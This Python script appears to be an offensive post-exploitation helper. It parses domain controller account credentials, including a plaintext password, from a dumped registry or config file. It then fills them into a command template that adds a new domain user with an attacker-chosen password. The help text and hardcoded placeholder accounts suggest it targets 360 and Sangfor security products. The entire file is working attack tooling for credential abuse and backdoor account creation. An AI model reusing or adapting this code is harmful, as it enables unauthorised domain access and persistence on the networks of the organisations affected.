import os
import re
import optparse

class Createcommand(object):
    def __init__(self,iswin=0,ip="",username="",password=""):
        if os.path.exists("command.txt") and os.path.exists("data.txt"):
            pass
        else:
            print("[-] Not Found command.txt")
            exit(1)

        data=open("data.txt","r",encoding="utf-8").read()
        if iswin==0:
            dcAccount=re.findall("dcAccount\".*",data)[0].split(" ")[-1].replace('"',"")
            dcAccountDN=re.findall("dcAccountDN\".*",data)[0]
            dc=re.findall("dc=.*",dcAccountDN)[0].replace('"',"")
            mail=".".join(dc.split(",")).replace("dc=","")
            dcAccountPassword=re.findall("dcAccountPassword\".*",data)[0].split("REG_SZ")[-1].rstrip().lstrip().rstrip('"').lstrip('"')
        else:
            dcAccount=re.findall("dcAccount .*",data)[0].split(" ")[-1]
            dcAccountDN=re.findall("dcAccountDN .*",data)[0].split(" ")[-1]
            dc=",".join(dcAccountDN.split(",")[-2::])
            mail=dc.replace("dc=","").replace(",",".")
            dcAccountPassword=re.findall("dcAccountPassword .*",data)[0].split("REG_SZ")[-1].lstrip()

        if '\\"' in dcAccountPassword or "'" in dcAccountPassword:
            dcAccountPassword=f"\"{dcAccountPassword}\""
        else:
            dcAccountPassword=f'\'{dcAccountPassword}\''
        print(f"[+] dcAccount:{dcAccount}")
        print(f"[+] dcAccountPassword:{dcAccountPassword}")
        print(f"[+] dc:{dc} | {mail}")
        command=open("command.txt","r",encoding="utf-8").read().format(dcAccount=dcAccount,dcAccountPassword=dcAccountPassword,dc=dc,mail=mail)
        if (username!=None and password!=None):
            command=command.replace("fuck360",username).replace("6@VIcZcGf3Gi&LgYVk3oK",password).replace("9AuPtjpCxH#GXQ70z2IVU",password)
        if iswin==0:
            print(command)
        else:
            command=re.sub("-x -h .*? ",f"-x -h {ip} ",command)
            print(command)

if __name__ == '__main__':
    parser=optparse.OptionParser()
    parser.add_option("-o",dest="os",help="Linux/Win")
    parser.add_option("-i",dest="ip",help="windows指定ip")
    parser.add_option("-u",dest="username",help="要添加的用户名")
    parser.add_option("-p",dest="password",help="添加用户名的密码")
    (option,args)=parser.parse_args()
    if option.os=="Linux":
        obj=Createcommand(username=option.username,password=option.password)
    elif option.os=="Win" and option.ip:
        obj=Createcommand(iswin=1,ip=option.ip,username=option.username,password=option.password)
    else:
        parser.print_help()
        print("示例:\n"
              "Linux:python create.py -o Linux\n"
              "Win:python create.py -o Win -i <IP> #因为dcAccount为hostname，所以windows得指定你的IP\n"
              "指定添加的用户和密码:\npython create.py -o Linux -u fucksxf -p RaidenMei520!\n"
              "python create.py -o Win -i <IP> -u fucksxf -p RaidenMei520!")
